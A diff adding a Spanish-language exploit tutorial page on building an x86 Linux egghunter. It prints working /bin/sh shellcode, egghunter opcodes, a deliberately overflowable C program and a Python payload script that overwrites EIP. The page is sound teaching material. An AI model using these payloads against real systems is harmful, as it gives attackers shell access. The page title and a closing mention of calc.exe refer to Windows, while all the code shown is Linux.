@@ -1,0 +1,395 @@
+
+
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="css/al_zo_ex.css">
+
+ 
+	<title>vulnserver - windows</title>
+</head>
+<body>
+
+<header>
+
+  <nav class="navbar navbar-expand-md navbar-light shadow-5-strong">
+      <div class="container-fluid">
+        <a class="navbar-brand text-primary" href="secur-home.html">learn@hacks#</a>
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#submenus" aria-controls="submenus" aria-expanded="false" arial-label="Toggler navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse justify-content-md-center" id="submenus">
+          <ul class="navbar-nav">
+            
+            <li class="nav-item active"><a class="nav-link text-primary" href="secur-home.html">Inicio</a></li>
+            <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle text-primary" href="#" data-bs-toggle="dropdown">Exploit Education</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofExEducation.html">Phoenix</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofNbEducation.html">Nebula</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofFsEducation.html">Fusion</a></li>
+                </ul>
+            </li>
+
+            <li class="nav-item dropdown">
+          <a class="nav-link dropdown-toggle text-primary" data-bs-toggle="dropdown" href="#">CTFs</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofVlhub.html">Vulnhub</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="picoFlags.html">picoCTF</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="RPISEC_MBE.html">RPISEC</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="pwnable_kr.html">pwnable</a></li>
+        </ul>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="shlpage.html">Shellcodes</a>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="tutoriales.html">Tutoriales</a>
+            </li> 
+
+            <li class="nav-item">
+              <a class="nav-link text-primary nav-link-color" href="https://github.com/BGPavelAng">Github</a>
+            </li>
+
+            <li>
+              <a class="nav-link text-primary nav-link-color" href="https://www.patreon.com/BGPavelAng">Patreon</a>
+            </li>
+
+          </ul>
+        </div>
+    </div>
+  </nav>
+</header>
+
+<div class="container-fluid">
+    <div class="row">
+      <div class="col">
+        <div class="img-bran d-none d-md-none d-lg-block">
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container mt-5">
+    <div class="row mt-5">
+      <div class="col">
+
+            <p><b>EGGHUNTER</b></p>
+            
+            
+            
+<p>Vamos a hacer un egghunter para lograr entender su funcionamiento.</p>
+
+<p>Para empezar cuando intentas explotar una vulnerabilidad se necesita restrear un buffer donde pueda entrar una shellcode, pero, ¿qué pasaría si los buffers encontrados son muy pequeños como para entrar una shellcode completa?, para eso, encontraron una forma, que sería meter en memoria una shellcode, después ejecutar un código en ese pequeño buffer que busca en memoria esa shellcode para después ejecutarlo.</p>
+
+<p>Recordemos que la memoria virtual son bloques de ciertos rangos contiguos, serían 4096 por pagina que convertido en hex sería 0x1000, tomemos la imagen de abajo para entender esto, usaremos la app, masamunpeX para extraer los datos.</p>
+
+<img class="img-fluid" src="vid/egg_1.png"><br><br>
+
+<p>En la imagen anterior podemos observa que hay varias paginas contiguas de 0x1000, en este caso esas paginas contiguas se encuentran en las 5 primeras lineas, las siguientes son lineas de memoria heap y varias otras utilizadas para el correcto funcionamiento, pero algo importante que hay que tomar en cuenta es que cada una tiene sus permisos, veamos las 5 primeras</p>
+
+<p>
+r-xp -> Esto significa que es la parte ejecutable, donde se encuentra el código de la section .text<br>
+r--p -> Esto significa que es la parte de constantes o statics, zonas que ya no son modificables, son solo de lectura, digamos section .rodata<br>
+rw-p -> Esto significa que es la parte de variables, zonas donde se puede escribir, variables para modificar, buffers, digamos section. data<br>
+</p>
+
+<p>Ahora, ¿cual es el objetivo?, meter en una de esos bloques una shellcode, hagamos un ejercicio para lograrlo.</p>
+
+<p>Vamos a ejecutar un egghunter sencillo, después haremos un código vulnerable para ejecutarlo en modo real.</p>
+
+<p>Primer tenemos que tener en cuenta que para encontrar la shellcode, tenemos que hacer algo para detectarlo, vamos a llamarlo, "firma", cuando encontremos esa firma, ejecutara una shell, esto se hacía con los joiners, pero hagamoslo con un exploit.</p>
+
+<p>La firma será "dead", pero en little endian será "daed", pero escribiremos "deaddead", solo será para asegurar que no está confundiendo la busqueda con una posible casualidad de palabra o hex.</p>
+
+<p>Primero colocaré el código y voy explicando a detalle.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+  global _start<br><br>
+
+section .text<br><br>
+
+_start:<br><br>
+
+
+xor ecx, ecx<br>
+xor ebx, ebx<br>
+
+pagina:<br><br>
+
+or dx, 0xfff<br><br>
+
+memoria:<br>
+inc edx<br>
+lea ebx, [edx + 0x4]<br>
+xor eax, eax<br>
+mov al, 0x21<br>
+int 0x80<br>
+cmp al, 0xf2<br>
+jz pagina<br><br>
+
+mov eax, 0x64616563<br>
+inc al<br>
+cmp eax, dword[edx]<br>
+jne memoria<br>
+cmp eax, dword[edx + 4]<br>
+jne memoria<br>
+add edx, 8<br>
+jmp edx<br><br>
+
+</p>
+
+<p>Esto es simple, vamos a limpiar un poco la memoria para evitar nulos o basura</p>
+
+<p>xor ecx, ecx<br>
+  xor ebx, ebx<br><br>
+  
+  pagina:<br><br>
+  
+  or dx, 0xfff<br><br>
+  
+  memoria:<br>
+  inc edx<br><br></p>
+
+<p>Recordemos que vamos a ir buscando pagina por pagina, y debemos hacerlo mediante 4096 bytes o 0x1000, así que convertimos 0xfff + 0x1 = 0x1000</p>
+
+<p>
+  lea ebx, [edx + 0x4]<br>
+xor eax, eax<br>
+mov al, 0x21<br>
+int 0x80<br>
+</p>
+
+<p>Ahora vamos a apuntar hacia la dirección para leer 8 bytes, "dead" = 4 + "dead" = 4, después limpiamos para evitar bytes extras o nulls y llamamos a una api, se llama <b>"int access(const char *pathname, int mode)"</b>, esa api es un call 0x21 y ejecutamos con int 0x80</p>
+
+<p>
+  cmp al, 0xf2<br>
+jz pagina
+</p>
+
+<p>como todo hay un return, eso nos ayuda a verificar si es un bloque con acceso a lectura y para eso tenemos que analizar que no encuentre el error 0xf2 también conocido como -14 EFAULT que se guarda en el registro EAX, si detecta que es igual a cero (0xXXXXXXf2 == 0xXXXXXXXXf2 = 0), analiza el siguiente bloque.</p>
+
+<p>mov eax, 0x64616563<br>
+  inc al<br>
+  cmp eax, dword[edx]<br>
+  jne memoria<br>
+  cmp eax, dword[edx + 4]<br>
+  jne memoria<br><br></p>
+
+  <p>movemos al registro dead, pero sería deac para incremetar 1 y sea dead... digamos, 0x64616563 + 1 = 0x64616564</p>
+
+  <p>esto simplemente para evitar bytes de más, si después comparamos con el inicio del registo edx y da igual 0x64616564 = 0x64616564, avanzamos sino analiza todo el bloque, sino lo encuentra salta a a la siguiente página, por esa razón es bueno colocar doble vez la firma.</p>
+
+  <p>después analizamos los siguiente 4 bytes y si da de resultado "deaddead", avanzamos, sino repetimos operación.</p>
+
+  <p>
+    add edx, 8<br>
+jmp edx<br><br>
+  </p>
+
+  <p>Aquí es donde vamos a la parte importante, vamos a ejecutar la shell guardada, cuando ya se encontró la firma, avanzamos los 8 bytes utilizados para la firma y brincamos a esa parte de la dirección donde ya se encuentra el inicio de la shellcode.</p>
+
+<p>Ya que tenemos esto, necesitamos una shell y algo para probar que funciona, vamos a programar una shell sencilla y un código en C para ejecutarlo.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+  section .text<br>
+    global _start<br><br>
+
+_start:<br>
+    xor eax, eax        ; Limpiar eax<br>
+    push eax            ; Terminar la cadena con un NULL (\x00)<br>
+    push 0x68732f2f     ; Push "//sh" (ajustado para el stack)<br>
+    push 0x6e69622f     ; Push "/bin"<br>
+    mov ebx, esp        ; Puntero a "/bin//sh"<br><br>
+
+    xor ecx, ecx        ; argv[] = NULL<br>
+    xor edx, edx        ; envp[] = NULL<br><br>
+
+    mov al, 0xb         ; syscall execve (0xb = 11)<br>
+    int 0x80            ; Llamar al kernel<br><br>
+
+</p>
+
+<p>Listo, ahora lo compilamos y sacamos los opcodes tanto de la shell como de la EGG usando objdump.</p>
+
+<p> objdump -d ./shellc|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'</p>
+
+<p>Ahora vamos a necesitar el código en C, voy a colocar uno y voy explicando.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+    
+    #define EGG "\x64\x65\x61\x64"<br><br>
+    int main() <br>
+    {<br>
+     const char stage[] = <br>
+         EGG EGG    <br>
+         "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"<br>
+         "\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";<br><br>
+    
+        const char code[] =<br>
+        "\x31\xc9\x31\xdb\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21"<br>
+        "\xcd\x80\x3c\xf2\x74\xed\xb8\x63\x65\x61\x64\xfe\xc0\x3b\x02\x75\xe7"<br>
+        "\x3b\x42\x04\x75\xe2\x83\xc2\x08\xff\xe2";<br><br>
+    
+        printf("Shellcode cantidad: %d\n", strlen(stage));<br>
+        printf("EggHunter cantidad: %d\n", strlen(code));<br>
+        int (*ret)() = (int(*)())code;<br>
+        ret();<br><br>
+    }<br><br>
+    
+</p>
+
+<p>#define EGG "\x64\x65\x61\x64"</p>
+<p>Esto es normal y creo todos entendemos.</p>
+
+<p>Abajo son los opcodes de la shell que acabamos de hacer usando la firma doble deaddead</p>
+
+<p>
+  const char stage[] = <br>
+     EGG EGG    <br>
+     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"<br>
+     "\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";<br><br>
+</p>
+
+<p>Abajo son los opcodes de la EGG que acabamos de hacer.</p>
+
+<p>
+  const char code[] =<br>
+    "\x31\xc9\x31\xdb\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21"<br>
+    "\xcd\x80\x3c\xf2\x74\xed\xb8\x63\x65\x61\x64\xfe\xc0\x3b\x02\x75\xe7"<br>
+    "\x3b\x42\x04\x75\xe2\x83\xc2\x08\xff\xe2";<br><br>
+</p>
+
+<p>Está es la parte rara donde desreferenciamos el ćodigo para lograr ejecutar los opcodes</p>
+
+<p>
+  printf("Shellcode cantidad: %d\n", strlen(stage));<br>
+    printf("EggHunter cantidad: %d\n", strlen(code));<br>
+    int (*ret)() = (int(*)())code;<br>
+    ret();<br><br>
+</p>
+
+<p>Vamos a ejecutarlo y listo.</p>
+
+  <img class="img-fluid" src="vid/egg_2.png"><br><br>
+
+<p>Esto ya es sencillo de entender, al ejecutar la app, mete stage y code en memoria, después ejecutamos code para encontrar el contenido de stage usando la firma EGG EGG, al encontrarlo, ejecutamos una shell.</p>
+
+<p>Vamos ahora a la parte donde lo ejecutamos con un ejemplo.</p>
+
+<p>El siguiente código será la app vulnerable, hay que recordar compilarlo sin protecciones.<br>
+  gcc -m32 -z execstack -z norelro -no-pie -fno-stack-protector -o vuln vuln.c<br><br></p>
+
+  <p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+    void vulnerable_function() {<br>
+      char buffer[100]; // Búfer vulnerable<br>
+      printf("Ingresa tus datos: ");<br><br>
+      
+      // Vulnerabilidad: read() permite desbordar el buffer si se envían más de 100 bytes<br>
+      read(0, buffer, 500); <br><br> 
+  
+      printf("Recibido: %s\n", buffer);<br><br>
+  }<br><br>
+  
+  int main() {<br>
+      printf("Ejecutando programa vulnerable...\n");<br>
+      vulnerable_function();<br>
+      printf("Finalizado.\n");<br>
+      return 0;<br>
+  }<br><br>
+  
+  </p>
+
+  <p>
+    Vamos a explotarlo, usaremos gdb, primero veamos donde sobreescribe EIP.
+  </p>
+
+<img class="img-fluid" src="vid/egg_3.png"><br><br>
+<img class="img-fluid" src="vid/egg_4.png"><br><br>
+<img class="img-fluid" src="vid/egg_5.png"><br><br>
+<img class="img-fluid" src="vid/egg_6.png"><br><br>
+<img class="img-fluid" src="vid/egg_7.png"><br><br>
+
+<p>Perfecto, vemos que son 112 bytes + 4 bytes, ahora busquemos hacia donde tenemos que brincar para iniciar la shell</p>
+
+<img class="img-fluid" src="vid/egg_8.png"><br><br>
+
+<p>Listo, ahora hay que enviar esos datos, hagamoslo desde python2</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+  EGG = "\x64\x65\x61\x64"<br><br>
+
+
+stage = (<br>
+    EGG + EGG + <br>
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"<br>
+    "\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"<br>
+)<br><br>
+
+payload1 = stage<br><br>
+
+egghunter = (<br>
+    "\x31\xc9\x31\xdb\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21"<br>
+    "\xcd\x80\x3c\xf2\x74\xed\xb8\x63\x65\x61\x64\xfe\xc0\x3b\x02\x75\xe7"<br>
+    "\x3b\x42\x04\x75\xe2\x83\xc2\x08\xff\xe2"<br>
+)<br><br>
+
+
+eip = struct.pack(I, 0xffffd07c)<br><br>
+
+buffer_size = 112 - len(stage)<br>
+padding = "A" * (buffer_size - len(egghunter))<br><br>
+
+payload2 = padding + egghunter + eip<br><br>
+
+sys.stdout.write(payload1)<br>
+sys.stdout.write(payload2)<br><br>
+</p>
+
+<p>
+  Practicamente es lo mismo que en C, pero al final usamos write para meter los payload en la app vulnerable.
+</p>
+
+<p>Como tenemos que mandar tanto stage como egghunter al mismo tiempo, tenemos que hacer algunas restas, recordemos que tiene como espacio máximo 112 bytes, a esos tienes que restarle el contenido en bytes de stage y egghunter.</p>
+
+<p>Hagamos primero un SIGTRAP</p>
+ 
+<p>cambiemos stage por un sigtrap<br>
+
+  sigtrap = (EGG + EGG + "\xcc"*23)<br></p>
+
+  <img class="img-fluid" src="vid/egg_9.png"><br><br>
+
+
+<p>Bueno, mandemos los payload a ver que pasa.</p>
+<p>Ahora repitamos lo mismo que el método primero, vamos a colocar un nop slide, despues colocamos la shell de calc.exe, rellenamos con junk y dejamos que haga su función nuevamente.</p>
+
+
+<img class="img-fluid" src="vid/egg_10.png"><br><br>
+
+<p>Listo.</p>
+      
+</div>
+
+    </div>
+  </div>
+  <footer class=" footer bg-light">
+    <div class="container-fluid mt-3">
+      <p class="mt-2">Aprende algo nuevo todos los días. Good luck!</p>
+    </div>
+  </footer>
+
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+</body>
+</html>
+      
